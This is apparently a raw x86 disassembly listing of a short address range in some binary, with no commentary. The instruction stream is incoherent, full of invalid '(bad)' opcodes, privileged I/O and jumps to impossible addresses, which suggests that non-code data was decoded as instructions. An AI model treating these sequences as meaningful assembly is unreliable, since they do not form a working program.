  41e5ba:	xor    bl,dh
  41e5bc:	popf   
  41e5bd:	jnp    0x41e582
  41e5bf:	inc    esp
  41e5c0:	add    edx,DWORD PTR [edx]
  41e5c2:	mov    BYTE PTR [ebp+0x46e08e8b],0xb2
  41e5c9:	mov    esi,0xf173d58e
  41e5ce:	in     al,dx
  41e5cf:	pop    ss
  41e5d0:	cmp    ebp,esi
  41e5d2:	push   0x3c
  41e5d4:	(bad)  
  41e5d5:	jmp    0x41e5fb
  41e5d7:	push   esi
  41e5d8:	repnz pushf 
  41e5da:	ins    BYTE PTR es:[edi],dx
  41e5db:	mov    bl,0xcf
  41e5dd:	retf   0x39ce
  41e5e0:	lea    esi,[ebx]
  41e5e2:	(bad)  
  41e5e3:	add    DWORD PTR [edi+ebp*4],ebp
  41e5e6:	mov    esi,0xd507c152
  41e5eb:	test   DWORD PTR [edx+0x1c],ecx
  41e5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ef:	out    dx,al
  41e5f0:	cs fucomi st,st(1)
  41e5f3:	pop    esp
  41e5f4:	cs sub al,0x87
  41e5f7:	fidiv  WORD PTR [edx+esi*8]
  41e5fa:	adc    eax,0x9a21c83b
  41e5ff:	test   BYTE PTR [ebp-0x76017f63],dl
  41e605:	pop    ds
  41e606:	adc    ebp,DWORD PTR [edx]
  41e608:	sbb    al,0xb7
  41e60a:	mov    ebp,0x795d8930
  41e60f:	test   al,0xf7
  41e611:	cmp    BYTE PTR [ebp+ecx*4-0x3e45b3aa],bl
  41e618:	(bad)  [esi]
  41e61a:	and    DWORD PTR [edi],eax
  41e61c:	mov    ecx,0x53cfb38e
  41e621:	fldcw  WORD PTR [edi+0x18]
  41e624:	inc    ebp
  41e625:	(bad)  
  41e626:	sbb    eax,0xc32eafb9
  41e62b:	mov    ecx,0x78572de1
  41e630:	(bad)  
  41e632:	test   DWORD PTR [edx+0x670be2c8],ebx
  41e638:	ret    0x96ac
  41e63b:	call   0xe84d6c63
  41e640:	mov    BYTE PTR [eax],ah
  41e642:	pop    ebx
  41e643:	idiv   DWORD PTR [ebp+0x26a319f0]
  41e649:	cdq    
  41e64a:	repnz mov esi,0xc6504120
  41e650:	hlt    
  41e651:	ins    DWORD PTR es:[edi],dx
  41e652:	sti    
  41e653:	cld    
  41e654:	dec    ebx
  41e655:	or     al,0xbe
  41e657:	xor    ecx,DWORD PTR [ebx]
  41e659:	bound  edx,QWORD PTR [edx+ebx*2+0x44]
  41e65d:	pop    ecx
  41e65e:	ja     0x41e664
  41e660:	jmp    0xc3cb6c4
  41e665:	xlat   BYTE PTR ds:[ebx]
  41e666:	add    eax,0x67f3d664
  41e66b:	ficom  DWORD PTR [ebx+edi*4]
  41e66e:	nop
  41e66f:	les    eax,FWORD PTR [esi]
  41e671:	ins    BYTE PTR es:[edi],dx
  41e672:	addr16 jle 0x41e5f6
  41e675:	in     eax,dx
  41e676:	jnp    0x41e645
  41e678:	xchg   ebp,eax
  41e679:	or     eax,0x95f0e539
  41e67e:	loop   0x41e674
  41e680:	dec    ecx
  41e681:	cmp    bl,ch
  41e683:	pop    ebx
  41e684:	push   edx
  41e685:	jge    0x41e64b
  41e687:	test   DWORD PTR [edx-0x50],0xd04c1338
  41e68e:	cs jae 0x41e65a
  41e691:	adc    DWORD PTR [esi+0x5],edi
  41e694:	inc    DWORD PTR [eax+0x1f]
  41e697:	push   esp
  41e698:	test   BYTE PTR [esi-0x56],bl
  41e69b:	push   edx
  41e69c:	ja     0x41e6fc
  41e69e:	in     al,0x76
  41e6a0:	(bad)  
  41e6a1:	cmp    al,0x45
  41e6a3:	fiadd  DWORD PTR [ebp-0x7898d594]
  41e6a9:	cmp    DWORD PTR [eax+ebx*1+0x1c],esp
  41e6ad:	xor    eax,0xb09956da
  41e6b2:	jno    0x41e635
  41e6b4:	(bad)  
  41e6b5:	neg    bh
  41e6b7:	sub    eax,0x76499ddb
  41e6bc:	mov    gs,edx
  41e6be:	in     al,dx
  41e6bf:	je     0x41e715
  41e6c1:	(bad)  
  41e6c2:	xor    BYTE PTR [edi],al
  41e6c4:	jmp    0x41e679
  41e6c6:	cmp    bh,BYTE PTR [ebx-0x77]
  41e6c9:	pop    esi
  41e6ca:	mov    ebp,0x47e4126c
  41e6cf:	dec    BYTE PTR [esi+0x21d1b3b3]
  41e6d5:	or     al,0x95
  41e6d7:	sbb    ebx,DWORD PTR [edi*2+0xb4564a5]
  41e6de:	push   ebp
  41e6df:	in     eax,0xf2
  41e6e1:	mov    esi,0x254217bd
  41e6e6:	sti    
  41e6e7:	(bad)  
  41e6e9:	mov    ebp,0xc757fe1
  41e6ee:	push   esp
  41e6ef:	cmp    BYTE PTR [ebp-0x41],ch
  41e6f2:	dec    ebp
  41e6f3:	cmc    
  41e6f4:	and    BYTE PTR [edi],ah
  41e6f6:	shr    DWORD PTR [esi+0x64],cl
  41e6f9:	mov    bh,0xf2
  41e6fb:	(bad)  
  41e6fc:	nop
  41e6fd:	(bad)  [eax-0x5d0c5dcd]
  41e703:	outs   dx,DWORD PTR ds:[esi]
  41e704:	jno    0x41e72b
  41e706:	inc    esp
  41e707:	test   al,al
  41e709:	test   dl,bl
  41e70b:	mov    BYTE PTR [eax+ebx*1-0x182b1800],al
  41e712:	jnp    0x41e779
  41e714:	retf   0x2a2
  41e717:	jp     0x41e737
  41e719:	cmc    
  41e71a:	xor    esi,DWORD PTR [ebx-0x11]
  41e71d:	mov    ebx,0xb1014b0b
  41e722:	xor    eax,0x7ee59273
  41e727:	pop    edx
  41e728:	inc    eax
  41e729:	xchg   DWORD PTR [ecx],eax
  41e72b:	mov    bl,0x9a
  41e72d:	push   esi
  41e72e:	dec    esi
  41e72f:	inc    esp
  41e730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e731:	xchg   esp,eax
  41e732:	inc    edx
  41e733:	scas   eax,DWORD PTR es:[edi]
  41e734:	adc    DWORD PTR ds:0x110d33e5,esi
  41e73a:	mov    al,BYTE PTR [eax]
  41e73c:	mov    DWORD PTR [edx-0x47],esi
  41e73f:	pop    ds
  41e740:	test   eax,0x5d776ed3
  41e745:	ret    0xfcc1
  41e748:	mov    esi,0xa57b2f69
  41e74d:	mov    cl,0x68
  41e74f:	(bad)  
  41e750:	lds    esp,FWORD PTR [edx+0x7a]
  41e753:	inc    ecx
  41e754:	dec    esp
  41e755:	xchg   esp,esi
  41e757:	push   edx
  41e758:	dec    esi
  41e759:	pop    edi
  41e75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e75b:	or     DWORD PTR [ecx],edi
  41e75d:	or     al,0x9d
  41e75f:	push   0x645e86e1
  41e764:	test   BYTE PTR [edi-0x23],cl
  41e767:	xlat   BYTE PTR ds:[ebx]
  41e768:	or     DWORD PTR [ecx-0x6df480c],0x7f
  41e76f:	shl    DWORD PTR [esi],cl
  41e771:	cwde   
  41e772:	adc    esp,DWORD PTR [edi]
  41e774:	adc    dh,dl
  41e776:	mov    WORD PTR [ecx-0x59],fs
  41e779:	mov    ch,0x8
  41e77b:	lea    ebp,[edi]
  41e77d:	call   0xda616ccc
  41e782:	imul   esi,ebx,0xa763c72
  41e788:	xlat   BYTE PTR ds:[ebx]
  41e789:	xor    DWORD PTR [ebp+0x55324c40],0x29
  41e790:	arpl   WORD PTR [esi+0xae8ac1d],si
  41e796:	sub    eax,0xa181151c
  41e79b:	xchg   DWORD PTR [ecx+0x296a5091],edi
  41e7a1:	or     DWORD PTR [ebp+edx*2-0x40b4605c],ebx
  41e7a8:	dec    ecx
  41e7a9:	mov    eax,0x3182507c
  41e7ae:	cmp    eax,0x4e6aa8d2
  41e7b3:	jle    0x41e7b9
  41e7b5:	dec    esi
  41e7b6:	call   0xb9f796eb
  41e7bb:	in     eax,dx
  41e7bc:	jo     0x41e7cd
  41e7be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7bf:	lds    esp,FWORD PTR [edi-0x58]
  41e7c2:	mov    edi,gs
  41e7c4:	mov    esp,0x8e45775a
  41e7c9:	inc    ecx
  41e7ca:	mov    al,0xe5
  41e7cc:	enter  0x5aae,0xd6
  41e7d0:	std    
  41e7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7d2:	test   DWORD PTR [eax],0x675cdbae
  41e7d8:	stos   DWORD PTR es:[edi],eax
  41e7d9:	or     eax,0x55219eab
  41e7de:	and    ebx,DWORD PTR [ebp+0x6ff241b5]
  41e7e4:	push   ss
  41e7e5:	pop    ebx
  41e7e6:	push   edx
  41e7e7:	adc    al,0x3a
  41e7e9:	loop   0x41e76f
  41e7eb:	cli    
  41e7ec:	sub    DWORD PTR [esp+esi*2],0x13
  41e7f0:	xchg   edi,eax
  41e7f1:	ja     0x41e83e
  41e7f3:	pop    ds
  41e7f4:	aas    
  41e7f5:	xor    bl,bl
  41e7f7:	stos   BYTE PTR es:[edi],al
  41e7f8:	jbe    0x41e803
  41e7fa:	mov    ds:0x668a83b1,al
  41e7ff:	cmp    BYTE PTR [ecx-0x54d2744],al
  41e805:	mov    ebx,cs
  41e807:	retf   
  41e808:	das    
  41e809:	in     al,dx
  41e80a:	outs   dx,DWORD PTR ds:[esi]
  41e80b:	or     al,0x45
  41e80d:	scas   eax,DWORD PTR es:[edi]
  41e80e:	push   ecx
  41e80f:	cmp    al,0x53
  41e811:	add    DWORD PTR [eax-0x2e],edx
  41e814:	stos   DWORD PTR es:[edi],eax
  41e815:	shl    BYTE PTR [edi-0xee78c3e],cl
  41e81b:	ds stos BYTE PTR es:[edi],al
  41e81d:	in     al,0x2d
  41e81f:	push   ds
  41e820:	adc    esp,DWORD PTR [ebp+0x2e12ba8b]
  41e826:	jns    0x41e7ce
  41e828:	fdivr  DWORD PTR [ebp+0x261b696e]
  41e82e:	mov    ds:0x3d1832fe,al
  41e833:	into   
  41e834:	int    0xe4
  41e836:	imul   ebx,DWORD PTR [edi+0x1],0xd2d64c7a
  41e83d:	out    dx,eax
  41e83e:	pop    ss
  41e83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e840:	push   ebx
  41e841:	pop    edi
  41e842:	push   edx
  41e843:	js     0x41e7fa
  41e845:	pop    edx
  41e846:	xchg   ebx,eax
  41e847:	imul   esp,DWORD PTR [esi+0x72],0xfffffff7
  41e84b:	gs push ecx
  41e84d:	sub    eax,0xbe02eb38
  41e852:	ins    DWORD PTR es:[edi],dx
  41e853:	daa    
  41e854:	lods   al,BYTE PTR ds:[esi]
  41e855:	dec    ebp
  41e856:	xor    ebx,DWORD PTR [ecx+0x63296872]
  41e85c:	shl    BYTE PTR [edi],0x98
  41e85f:	xchg   edi,eax
  41e860:	inc    esi
  41e861:	mov    ebx,0x35c9b74f
  41e866:	adc    al,0x6d
  41e868:	pop    edi
  41e869:	pop    es
  41e86a:	cmp    DWORD PTR [eax+eax*2],0x9e6780df
  41e871:	cmp    eax,0xe0880e5e
  41e876:	push   edx
  41e877:	shl    DWORD PTR [edi],0xe1
  41e87a:	cdq    
  41e87b:	dec    esi
  41e87c:	adc    BYTE PTR [eax],0xe8
  41e87f:	push   ss
  41e880:	retf   
  41e881:	and    al,0x69
  41e883:	pop    esp
  41e884:	jmp    0x1a7154a0
  41e889:	lods   eax,DWORD PTR ds:[esi]
  41e88a:	inc    edi
  41e88b:	dec    ebx
  41e88c:	cmp    al,0xa1
  41e88e:	iret   
  41e88f:	je     0x41e8a3
  41e891:	xchg   ecx,eax
  41e892:	pop    ds
  41e893:	and    BYTE PTR [ebx],ch
  41e895:	mov    ch,BYTE PTR ds:0x3d0f389b
  41e89b:	and    DWORD PTR [ebx-0x5fd81452],edx
  41e8a1:	movq   mm2,mm1
  41e8a4:	nop
  41e8a5:	in     al,dx
  41e8a6:	mov    edx,0xbeb10c70
  41e8ab:	mov    edi,0xdcc71cf0
  41e8b0:	push   ebp
  41e8b1:	sub    ecx,DWORD PTR [ecx-0x4f]
  41e8b4:	jnp    0x41e888
  41e8b6:	(bad)  
  41e8b7:	sub    BYTE PTR [edi],cl
  41e8b9:	cld    
  41e8ba:	mov    eax,ds:0xeddd9f9
  41e8bf:	outs   dx,BYTE PTR ds:[esi]
  41e8c0:	(bad)  
  41e8c1:	jb     0x41e902
  41e8c3:	sub    eax,0xd44b8926
  41e8c8:	adc    edi,esi
  41e8ca:	popa   
  41e8cb:	push   ebp
  41e8cc:	push   es
  41e8cd:	retf   
  41e8ce:	and    eax,edx
  41e8d0:	or     al,0x4b
  41e8d2:	mov    bh,BYTE PTR ss:[ebp-0x34]
  41e8d6:	add    BYTE PTR [ebx],al
  41e8d8:	or     ebp,DWORD PTR [esi]
  41e8da:	sbb    eax,0xc474e8b3
  41e8df:	ss test cl,bl
  41e8e2:	addr16 test al,0xd7
  41e8e5:	and    DWORD PTR [ecx+ebp*8+0x28],0x548d6d06
  41e8ed:	jp     0x41e93c
  41e8ef:	cmp    ebp,DWORD PTR [ebx]
  41e8f1:	into   
  41e8f2:	cmp    BYTE PTR [esp+ebx*4-0x2011a65e],bl
  41e8f9:	mov    es,ecx
  41e8fb:	jp     0x41e902
  41e8fd:	inc    ebx
  41e8fe:	outs   dx,DWORD PTR ds:[esi]
  41e8ff:	pusha  
  41e900:	jb     0x41e8b2
  41e902:	cmp    bl,BYTE PTR [esi+0x39]
  41e905:	sahf   
  41e906:	xchg   edx,eax
  41e907:	push   es
  41e908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e909:	cmp    al,0x97
  41e90b:	pop    ss
  41e90c:	inc    edx
  41e90d:	je     0x41e8ce
  41e90f:	cld    
  41e910:	mov    es,WORD PTR [esi+0x21609e6c]
  41e916:	mov    ebp,0x368ad1de
  41e91b:	or     al,0xae
  41e91d:	mov    ah,0x42
  41e91f:	mov    WORD PTR [ebp+0x779a097c],ss
  41e925:	ja     0x41e99a
  41e927:	cmp    edi,DWORD PTR [eax]
  41e929:	js     0x41e907
  41e92b:	add    al,0xf6
  41e92d:	adc    eax,0x55439ee
  41e932:	jle    0x41e8ef
  41e934:	jmp    0x80a8:0xc2304eaf
  41e93b:	nop
  41e93c:	sbb    esp,esi
  41e93e:	cmp    DWORD PTR [ebx+ecx*2-0x22],edi
  41e942:	in     eax,dx
  41e943:	(bad)  
  41e945:	mov    esp,0xed0730e4
  41e94a:	test   eax,0x71d2e7e
  41e94f:	jg     0x41e974
  41e951:	je     0x41e909
  41e953:	test   al,0x17
  41e955:	pushf  
  41e956:	lods   al,BYTE PTR ds:[esi]
  41e957:	popf   
  41e958:	out    dx,al
  41e959:	fcom   DWORD PTR [esi-0x4b72652d]
  41e95f:	icebp  
  41e960:	mov    ecx,0xe06ca717
  41e965:	leave  
  41e966:	or     al,0x9
  41e968:	outs   dx,DWORD PTR ds:[esi]
  41e969:	iret   
  41e96a:	mov    ss,WORD PTR [ecx+0x6c]
  41e96d:	adc    eax,DWORD PTR [ebp+0x44]
  41e970:	aas    
  41e971:	aas    
  41e972:	cmp    DWORD PTR [ebx-0x1c3ee12],ebp
  41e978:	mov    WORD PTR [edx+ecx*8+0x53],es
  41e97c:	jae    0x41e9ee
  41e97e:	adc    ch,ah
  41e980:	addr16 test al,0x3e
  41e983:	pop    ecx
  41e984:	or     BYTE PTR [edx+esi*8-0x1ca5b16a],dl
  41e98b:	mov    bl,BYTE PTR [edi+0x3187cee5]
  41e991:	or     BYTE PTR [eax+0x71],0x65
  41e995:	push   es
  41e996:	test   BYTE PTR [esp+eiz*2+0x62],cl
  41e99a:	test   BYTE PTR [eax-0x2bd78c1d],ah
  41e9a0:	sbb    DWORD PTR [ebx-0x7114ba10],edi
  41e9a6:	inc    esi
  41e9a7:	mov    bl,0x54
  41e9a9:	mov    ebx,0x3c359cf
  41e9ae:	icebp  
  41e9af:	addr16 (bad) 
  41e9b1:	jne    0x41e9b7
  41e9b3:	lods   eax,DWORD PTR ds:[esi]
  41e9b4:	inc    ecx
  41e9b5:	pop    ebp
  41e9b6:	ins    BYTE PTR es:[edi],dx
  41e9b7:	push   ecx
  41e9b8:	cmc    
  41e9b9:	add    eax,0xfbc38219
  41e9be:	ficom  WORD PTR [ebx+0x13]
  41e9c1:	out    0xe2,eax
  41e9c3:	js     0x41e983
  41e9c5:	cld    
  41e9c6:	xor    al,0x62
  41e9c8:	shr    DWORD PTR ds:0x276df11d,cl
  41e9ce:	jbe    0x41ea37
  41e9d0:	mov    dh,0x82
  41e9d2:	or     bl,BYTE PTR [esi]
  41e9d4:	sub    eax,edi
  41e9d6:	add    esi,esp
  41e9d8:	push   cs
  41e9d9:	push   esi
  41e9da:	fcomip st,st(2)
  41e9dc:	inc    edi
  41e9dd:	in     eax,0xce
  41e9df:	mov    bh,BYTE PTR [ebx]
  41e9e1:	add    ebx,DWORD PTR [ebx]
  41e9e3:	inc    edx
  41e9e4:	ins    BYTE PTR es:[edi],dx
  41e9e5:	shl    esp,1
  41e9e7:	jmp    0x61f3:0xeaa2d6da
  41e9ee:	pop    ecx
  41e9ef:	outs   dx,BYTE PTR ds:[esi]
  41e9f0:	mov    WORD PTR [ebx+0x2f],?
  41e9f3:	inc    ecx
  41e9f4:	cmp    al,0x93
  41e9f6:	pop    es
  41e9f7:	inc    ebx
  41e9f8:	addr16 jns 0x41ea16
  41e9fb:	add    BYTE PTR [ecx],0x97
  41e9fe:	xchg   edx,eax
  41e9ff:	ins    DWORD PTR es:[edi],dx
  41ea00:	add    edx,ebx
  41ea02:	test   eax,0xa1d56115
  41ea07:	lods   eax,DWORD PTR ds:[esi]
  41ea08:	add    dh,BYTE PTR [eax]
  41ea0a:	(bad)  
  41ea0b:	mov    ds,WORD PTR [edi+ebp*8]
  41ea0e:	and    DWORD PTR [ecx+0x7cc356bc],esp
  41ea14:	mov    BYTE PTR [esi],dl
  41ea16:	jns    0x41ea92
  41ea18:	ror    DWORD PTR [eax+0x75],cl
  41ea1b:	mov    ecx,0x228ae311
  41ea20:	dec    eax
  41ea21:	(bad)  
  41ea22:	jp     0x41ea4e
  41ea24:	mov    ds:0x222af2bd,al
  41ea29:	pop    ds
  41ea2a:	fsubr  DWORD PTR [edx-0x6e3ecc0]
  41ea30:	cmp    ebp,0xffffffc2
  41ea33:	lods   eax,DWORD PTR ds:[esi]
  41ea34:	jo     0x41e9d9
  41ea36:	and    ah,bl
  41ea38:	dec    ebp
  41ea39:	mov    WORD PTR [ebp-0x481d7021],gs
  41ea3f:	dec    DWORD PTR [ecx-0x7a]
  41ea42:	push   cs
  41ea43:	mov    WORD PTR cs:[ecx+0x62],ds
  41ea47:	arpl   WORD PTR [edx-0x6b],si
  41ea4a:	ror    BYTE PTR [edi],0x9f
  41ea4d:	data16 cld 
  41ea4f:	in     eax,dx
  41ea50:	jecxz  0x41ea48
  41ea52:	std    
  41ea53:	inc    esi
  41ea54:	das    
  41ea55:	data16 in al,dx
  41ea57:	push   ecx
  41ea58:	inc    ebx
  41ea59:	xor    BYTE PTR [ecx],bl
  41ea5b:	sti    
  41ea5c:	cli    
  41ea5d:	pop    ecx
  41ea5e:	lods   eax,DWORD PTR ds:[esi]
  41ea5f:	and    eax,0x54ca20da
  41ea64:	(bad)  
  41ea65:	mov    cl,ch
  41ea67:	test   eax,0x77c9ed04
  41ea6c:	inc    edi
  41ea6d:	fstp   TBYTE PTR [eax+0xe]
  41ea70:	sub    ecx,ebp
  41ea72:	and    eax,0x95bd78a3
  41ea77:	js     0x41ea9b
  41ea79:	inc    esi
  41ea7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea7b:	sub    dh,BYTE PTR [ebp-0x2a]
  41ea7e:	add    DWORD PTR [esi],esp
  41ea80:	and    al,0xfb
  41ea82:	pop    ss
  41ea83:	jae    0x41ea0f
  41ea85:	mov    dh,0xd8
  41ea87:	int3   
  41ea88:	inc    esi
  41ea89:	adc    al,0xf8
  41ea8b:	jnp    0x41eaf0
  41ea8d:	test   ch,0xe7
  41ea90:	icebp  
  41ea91:	dec    ecx
  41ea92:	sbb    ebp,edx
  41ea94:	(bad)  
  41ea95:	aad    0xdd
  41ea97:	shl    DWORD PTR [edi-0x34b4a2c1],1
  41ea9d:	dec    edi
  41ea9e:	inc    ebx
  41ea9f:	test   DWORD PTR ds:0xe127bd91,0x45dd5507
  41eaa9:	aad    0x4d
  41eaab:	or     bh,BYTE PTR [eax]
  41eaad:	xor    ah,BYTE PTR [edi+0x685a246]
  41eab3:	test   al,0xb8
  41eab5:	cmp    ecx,DWORD PTR [edi+0x7b]
  41eab8:	push   ebx
  41eab9:	shl    BYTE PTR [ebx+eiz*4-0x31],cl
  41eabd:	add    al,0xee
  41eabf:	add    ch,ch
  41eac1:	jne    0x41eb19
  41eac3:	iret   
  41eac4:	adc    ecx,DWORD PTR [edi]
  41eac6:	arpl   WORD PTR [eax],bx
  41eac8:	icebp  
  41eac9:	mov    al,dl
  41eacb:	push   0x5f
  41eacd:	stos   DWORD PTR es:[edi],eax
  41eace:	lock mov edx,0x46bd1666
  41ead4:	arpl   WORD PTR [edi],bx
  41ead6:	mov    ebp,0xd4151959
  41eadb:	jecxz  0x41eb15
  41eadd:	fmul   st,st(0)
  41eadf:	add    cl,bh
  41eae1:	call   0xfde76ac
  41eae6:	js     0x41ea6d
  41eae8:	imul   ecx,DWORD PTR [ebp+0x5963f7fa],0x4dab973f
  41eaf2:	sub    eax,0xc85a3302
  41eaf7:	imul   esp,DWORD PTR [ebx+0x6c5a5a54],0x3b
  41eafe:	adc    ecx,DWORD PTR [edx-0x1c4f6d51]
  41eb04:	arpl   WORD PTR [edi+0x60],ax
  41eb07:	add    DWORD PTR [eax+0x42323614],ebx
  41eb0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb0e:	pop    ebp
  41eb0f:	sti    
  41eb10:	rol    DWORD PTR [edi],0xb0
  41eb13:	aam    0xa7
  41eb15:	shl    DWORD PTR [esi-0x5af6838f],1
  41eb1b:	mov    esp,0xba7efbbb
  41eb20:	push   edx
  41eb21:	adc    eax,eax
  41eb23:	dec    edx
  41eb24:	adc    DWORD PTR [ecx],ebp
  41eb26:	int3   
  41eb27:	sub    ah,BYTE PTR [esi+0x56675cda]
  41eb2d:	inc    edi
  41eb2e:	test   DWORD PTR [edx+0x3b],edx
  41eb31:	xchg   DWORD PTR [ecx],edi
  41eb33:	xor    eax,0x27f93034
  41eb38:	mov    DWORD PTR [ebp-0x7e156842],esp
  41eb3e:	pop    esi
  41eb3f:	or     al,0x14
  41eb41:	jns    0x41eba6
  41eb43:	xchg   ebx,eax
  41eb44:	jne    0x41eb34
  41eb46:	push   eax
  41eb47:	push   0x5d
  41eb49:	int    0x1d
  41eb4b:	out    dx,al
  41eb4c:	push   esp
  41eb4d:	mov    ah,BYTE PTR [edi-0xfdcc28e]
  41eb53:	out    dx,al
  41eb54:	sub    BYTE PTR [edi-0xe],dl
  41eb57:	xor    BYTE PTR [ebx-0x27],cl
  41eb5a:	pop    ss
  41eb5b:	sbb    BYTE PTR [edi+0x7a],al
  41eb5e:	loopne 0x41eb8f
  41eb60:	jg     0x41eb54
  41eb62:	int3   
  41eb63:	jge    0x41ebc6
  41eb65:	jecxz  0x41eb0a
  41eb67:	add    ecx,DWORD PTR [esi]
  41eb69:	mov    ecx,0xf9cd491e
  41eb6e:	push   es
  41eb6f:	out    dx,al
  41eb70:	(bad)  
  41eb71:	dec    edx
  41eb72:	ss fs dec ebp
  41eb75:	sti    
  41eb76:	ja     0x41ebe7
  41eb78:	div    ecx
  41eb7a:	sbb    eax,0x2284c4b7
  41eb7f:	pop    es
  41eb80:	dec    ebp
  41eb81:	test   esp,esp
  41eb83:	adc    BYTE PTR [ebp-0x7b],0x16
  41eb87:	test   eax,esi
  41eb89:	stos   DWORD PTR es:[edi],eax
  41eb8a:	push   edx
  41eb8b:	add    eax,0xd9e64c44
  41eb90:	jmp    0x41eb26
  41eb92:	inc    esp
  41eb93:	mov    ebp,0xbff02cab
  41eb98:	inc    esp
  41eb99:	rol    BYTE PTR fs:[ebx],1
  41eb9c:	cs (bad) 
  41eb9e:	adc    DWORD PTR [eax],esi
  41eba0:	test   eax,0x4b4867e3
  41eba5:	xchg   BYTE PTR [ebx+edx*1],bl
  41eba8:	loopne 0x41ec13
  41ebaa:	into   
  41ebab:	mov    cl,0xa2
  41ebad:	scas   al,BYTE PTR es:[edi]
  41ebae:	adc    BYTE PTR [eax+ebx*2],al
  41ebb1:	xor    BYTE PTR [ebx],0x2a
  41ebb4:	cmp    ah,BYTE PTR [ebx-0x1150f370]
  41ebba:	ror    DWORD PTR ds:0x29c05e86,cl
  41ebc0:	aam    0x8b
  41ebc2:	push   ds
  41ebc3:	js     0x41ec28
  41ebc5:	cmp    al,0xed
  41ebc7:	mov    edi,0x5acc948b
  41ebcc:	dec    edx
  41ebcd:	arpl   WORD PTR [ebx+0x5316d30b],si
  41ebd3:	fwait
  41ebd4:	or     edi,eax
  41ebd6:	push   es
  41ebd7:	mov    ch,0x68
  41ebd9:	mov    esp,0xabe7116c
  41ebde:	sub    eax,0x53d9a951
  41ebe3:	cli    
  41ebe4:	pushf  
  41ebe5:	inc    esp
  41ebe6:	mov    esi,0x830bc4ce
  41ebeb:	jmp    0x41eb97
  41ebed:	push   es
  41ebee:	js     0x41eb99
  41ebf0:	test   eax,0xbfabd8a2
  41ebf5:	or     eax,0x41e291d3
  41ebfa:	inc    edx
  41ebfb:	sub    esi,DWORD PTR [ebx+0x16]
  41ebfe:	xchg   edx,eax
  41ebff:	add    DWORD PTR [ebp-0xf79d552],ebx
  41ec05:	cwde   
  41ec06:	test   al,0x99
  41ec08:	xor    dh,dh
  41ec0a:	(bad)  
  41ec0b:	pop    esp
  41ec0c:	xchg   BYTE PTR [ebx+edi*1],dh
  41ec0f:	mov    edx,0x61527e87
  41ec14:	test   DWORD PTR [edi+0x29],esp
  41ec17:	cmp    ebp,edi
  41ec19:	into   
  41ec1a:	pop    ss
  41ec1b:	fstp   st(0)
  41ec1d:	jbe    0x41ebc7
  41ec1f:	jp     0x41ebf6
  41ec21:	xchg   ecx,eax
  41ec22:	jmp    DWORD PTR [ebx+0x40]
  41ec25:	cwde   
  41ec26:	mov    ch,BYTE PTR [esi-0x73b9870]
  41ec2c:	sbb    DWORD PTR [ecx+0x20],esp
  41ec2f:	sbb    bh,BYTE PTR [edx]
  41ec31:	mov    al,0xd4
  41ec33:	pushf  
  41ec34:	inc    esi
  41ec35:	jns    0x41ec70
  41ec37:	and    eax,0xfb91f0ab
  41ec3c:	loopne 0x41ec82
  41ec3e:	xchg   DWORD PTR [eax+0x3857000e],edi
  41ec44:	push   ebx
  41ec45:	mov    bh,0xdb
  41ec47:	outs   dx,BYTE PTR ds:[esi]
  41ec48:	jle    0x41ec86
  41ec4a:	clc    
  41ec4b:	test   BYTE PTR [edx],0x3f
  41ec4e:	push   ecx
  41ec4f:	lods   eax,DWORD PTR ds:[esi]
  41ec50:	sub    al,0x73
  41ec52:	or     BYTE PTR [ecx+0x4],ch
  41ec55:	iret   
  41ec56:	sub    al,0x4a
  41ec58:	fcomp  DWORD PTR ds:0xb44b3630
  41ec5e:	cmp    al,0x52
  41ec60:	loope  0x41ecd2
  41ec62:	dec    ebp
  41ec63:	push   esi
  41ec64:	stos   BYTE PTR es:[edi],al
  41ec65:	sub    al,BYTE PTR [ecx+0x2db8e2d1]
  41ec6b:	jnp    0x41ec5f
  41ec6d:	jecxz  0x41ec59
  41ec6f:	inc    edx
  41ec70:	sbb    al,0xa7
  41ec72:	push   0xffffff8b
  41ec74:	and    edi,esp
  41ec76:	sbb    DWORD PTR [esi-0x4e4a6bd7],0xecd7a82a
  41ec80:	add    eax,0x535d0c5c
  41ec85:	jno    0x41ec4f
  41ec87:	sbb    ch,0x84
  41ec8a:	cmp    al,0x9b
  41ec8c:	pop    esp
  41ec8d:	retf   0xa594
  41ec90:	ret    0x6785
  41ec93:	aaa    
  41ec94:	pop    ss
  41ec95:	and    DWORD PTR [eax],esi
  41ec97:	sub    eax,0x1b9f9dbc
  41ec9c:	jmp    0x8076:0xc51a53f0
  41eca3:	xchg   esp,eax
  41eca4:	das    
  41eca5:	adc    DWORD PTR [ebx-0x351c4c1f],edi
  41ecab:	ins    DWORD PTR es:[edi],dx
  41ecac:	out    0x5e,eax
  41ecae:	(bad)  
  41ecaf:	fs add al,0x5
  41ecb2:	call   0x232a:0xeba35256
  41ecb9:	pop    es
  41ecba:	ficomp WORD PTR [ebx]
  41ecbc:	arpl   WORD PTR [esi+0x3e],dx
  41ecbf:	jle    0x41ec56
  41ecc1:	dec    esp
  41ecc2:	jmp    0x41ec54
  41ecc4:	fdivr  QWORD PTR [ebx+0x23]
  41ecc7:	cmp    DWORD PTR [ebx],ebp
  41ecc9:	cwde   
  41ecca:	mov    cl,BYTE PTR [edi+esi*1+0x57]
  41ecce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eccf:	push   ebp
  41ecd0:	inc    esi
  41ecd1:	mov    WORD PTR ds:0xc0352905,cs
  41ecd7:	jmp    0x41ec70
  41ecd9:	std    
  41ecda:	pop    ecx
  41ecdb:	cs cld 
  41ecdd:	xor    ch,cl
  41ecdf:	icebp  
  41ece0:	or     edi,edx
  41ece2:	arpl   dx,ax
  41ece4:	test   BYTE PTR [ebx-0x365977fc],0xcc
  41eceb:	inc    esi
  41ecec:	aas    
  41eced:	xchg   DWORD PTR [eax-0x7c],ebx
  41ecf0:	push   esi
  41ecf1:	and    al,0x1b
  41ecf3:	icebp  
  41ecf4:	xlat   BYTE PTR ds:[ebx]
  41ecf5:	mov    ah,0x4f
  41ecf7:	mov    al,0x92
  41ecf9:	pop    esp
  41ecfa:	mov    al,ds:0x281c6ebc
